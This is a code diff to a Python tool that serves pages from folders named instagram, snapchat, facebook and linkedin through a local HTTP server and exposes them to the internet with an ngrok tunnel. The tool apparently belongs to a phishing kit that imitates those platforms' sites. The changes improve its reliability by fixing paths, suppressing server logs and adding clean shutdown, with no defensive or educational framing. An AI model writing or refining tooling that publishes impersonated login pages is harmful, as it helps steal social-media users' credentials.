@@ -67,34 +67,50 @@ def generate_link(platform):
     return serve_website(platform)
 
 def serve_website(platform):
+    # Get the absolute path to the web directory
+    current_dir = os.path.dirname(os.path.abspath(__file__))
+    
     # Define the directory to serve based on platform
     if platform.lower() == 'instagram':
-        directory = 'web/instagram'
+        directory = os.path.join(current_dir, 'web', 'instagram')
     elif platform.lower() == 'snapchat':
-        directory = 'web/snapchat'
+        directory = os.path.join(current_dir, 'web', 'snapchat')
     elif platform.lower() == 'facebook':
-        directory = 'web/facebook'
+        directory = os.path.join(current_dir, 'web', 'facebook')
     elif platform.lower() == 'linkedin':
-        directory = 'web/linkedin'
+        directory = os.path.join(current_dir, 'web', 'linkedin')
     else:
         print("Invalid platform selected")
         return None
 
-    # Change to the selected platform directory
+    # Change to the platform directory
     os.chdir(directory)
     
     try:
         # Start a simple HTTP server in the background
         PORT = random.randint(8000,9000)  # Random port to avoid conflicts
-        Handler = http.server.SimpleHTTPRequestHandler
+        
+        class CustomHandler(http.server.SimpleHTTPRequestHandler):
+            def __init__(self, *args, **kwargs):
+                super().__init__(*args, directory=directory, **kwargs)
+            
+            def log_message(self, format, *args):
+                # Suppress log messages
+                pass
+                
+            def do_GET(self):
+                # Serve index.html for root path
+                if self.path == '/':
+                    self.path = '/index.html'
+                return http.server.SimpleHTTPRequestHandler.do_GET(self)
         
         try:
-            httpd = socketserver.TCPServer(("", PORT), Handler)
+            httpd = socketserver.TCPServer(("", PORT), CustomHandler)
             print(f"\n✓ Local server started on port {PORT}")
         except OSError as e:
             print(f"× Port {PORT} is in use, trying another port...")
             PORT = random.randint(9001,10000)
-            httpd = socketserver.TCPServer(("", PORT), Handler)
+            httpd = socketserver.TCPServer(("", PORT), CustomHandler)
             print(f"✓ Local server started on port {PORT}")
         
         # Start the server in a separate process
@@ -131,7 +147,6 @@ def serve_website(platform):
                 print(colored(url, 'green', attrs=['bold']))
                 print(colored("Press Ctrl+C to stop", 'red'))
                 print("=" * 60 + "\n")
-                os.chdir("../../")  # Return to original directory
                 
                 # Keep running until Ctrl+C
                 try:
@@ -139,20 +154,27 @@ def serve_website(platform):
                         time.sleep(1)
                 except KeyboardInterrupt:
                     print("\n\nStopping server...")
+                    httpd.shutdown()
+                    httpd.server_close()
                     if os.name == 'nt':
                         os.system('taskkill /f /im ngrok.exe 2>nul')
                     else:
                         os.system('pkill ngrok')
+                    os.chdir(current_dir)  # Return to original directory
                     return None
                     
             else:
                 print("× Error: No ngrok tunnels found")
-                os.chdir("../../")
+                httpd.shutdown()
+                httpd.server_close()
+                os.chdir(current_dir)
                 return None
                 
         except Exception as e:
             print(f"× Error getting ngrok URL: {str(e)}")
-            os.chdir("../../")
+            httpd.shutdown()
+            httpd.server_close()
+            os.chdir(current_dir)
             return None
             
     except Exception as e:
@@ -162,7 +184,7 @@ def serve_website(platform):
         print("2. Check your internet connection")
         print("3. Make sure no other ngrok instances are running")
         print("4. Try running with sudo: sudo python3 main.py")
-        os.chdir("../../")
+        os.chdir(current_dir)
         return None
 
 def print_menu():
